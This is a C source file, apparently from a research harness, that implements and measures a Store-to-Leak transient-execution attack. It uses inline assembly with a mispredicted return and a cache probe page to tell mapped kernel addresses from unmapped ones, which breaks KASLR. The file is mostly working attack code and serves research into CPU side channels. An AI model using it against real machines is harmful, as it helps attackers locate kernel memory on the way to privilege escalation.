// evaluate the store-to-leak attack

#include "common.h"

#include <cpuid.h>
#include <stdint.h>
#include <string.h>
#include <sys/user.h>
#include <unistd.h>

#define RUNS_PER_ADDR 8
#define THRESHOLD 2

// hardcoded base address of the main kernel image
#define KERNEL_BASE 0xffffffff80000000
// some unmapped address in kernel space
#define UNMAPPED 0xffffffff00000000

// static mapping of a single page used as cache probe
static page_t *probe_page;

// write 0 to target address, load value from target address, encode loaded value in cache
// all during transient execution, triggered by a mispredicted return instruction
UNUSED NAKED static void access_transient(UNUSED uintptr_t target,
        UNUSED const page_t *probe_page) {
    asm("call setret;"
        "attack:"
        // *target = 0
        "movb $0, (%rdi);"
        // rax = *target
        "movzbl (%rdi), %eax;"
        // access probe_arr[rax]
        "shl $12, %rax;"
        "mov (%rsi, %rax), %rax;"
        "setret:"
        // rax = &doret
        "lea doret(%rip), %rax;"
        // execute some instructions depending on rax
        // to introduce data dependencies
        ".rept 16;"
        "imul $1, %rax, %rax;"
        ".endr;"
        // overwrite return address and return
        // return to attack will be predicted
        // real return is to doret
        "mov %rax, (%rsp);"
        "ret;"
        "doret: ret;");
}

// write 0 to target address, load value from target address, encode loaded value in cache
UNUSED NAKED static void access_normal(UNUSED uintptr_t target, UNUSED const page_t *probe_page) {
    asm("attack:"
        // *target = 0
        "movb $0, (%rdi);"
        // rax = *target
        "movzbl (%rdi), %eax;"
        // access probe_arr[rax]
        "shl $12, %rax;"
        "mov (%rsi, %rax), %rax;"
        "ret;");
}

// execute a single store-to-leak iteration
static bool single_probe(uintptr_t target) {

    // try to trigger store-to-load forwarding on the target address while handling faults

#if defined(FAULT_SIGNAL)
    if (try_begin()) {
        access_normal(target, probe_page);
        try_abort();
    }

#elif defined(FAULT_TRANSIENT)
    access_transient(target, probe_page);

#else
#error "Invalid fault handling"
#endif

    // check if the store-to-load forwarding happened

#if defined(CACHE_FR)
    return cyclecount_access_flush(probe_page) < THRESHOLD_FR;

#elif defined(CACHE_FF)
    return cyclecount_flush(probe_page) >= THRESHOLD_FF;

#else
#error "Invalid cache sidechannel"
#endif
}

// use store-to-leak to determine if the target address is mapped
static bool probe_addr(uintptr_t target) {
    size_t hits = 0;
    // record number of hits
    for (size_t run = 0; run < RUNS_PER_ADDR; run++)
        if (single_probe(target))
            hits++;
    // classify as mapped if threshold is reached
    return hits >= THRESHOLD;
}

void attacker(void) {
    // prepare probe page
    probe_page = mmap_pages(1);
    mem_access(probe_page);

    size_t hits_mapped = 0;
    size_t hits_unmapped = 0;

    uint64_t start = get_wall_time_ns();

    for (size_t i = 0; i < SAMPLE_COUNT; i++)
        // probe a mapped address
        if (probe_addr(KERNEL_BASE + 0x1000000))
            hits_mapped++;

    uint64_t mid = get_wall_time_ns();

    for (size_t i = 0; i < SAMPLE_COUNT; i++)
        // probe an unmapped address
        if (probe_addr(UNMAPPED))
            hits_unmapped++;

    uint64_t end = get_wall_time_ns();

    double time_mapped = (double)(mid - start) / SAMPLE_COUNT / 1e9;
    double time_unmapped = (double)(end - mid) / SAMPLE_COUNT / 1e9;

    // print hit rate and time, for mapped and unmapped pages
    printf("%lg,%lg,%lg,%lg\n",
            (double)hits_mapped / SAMPLE_COUNT,
            (double)hits_unmapped / SAMPLE_COUNT,
            time_mapped,
            time_unmapped);
}
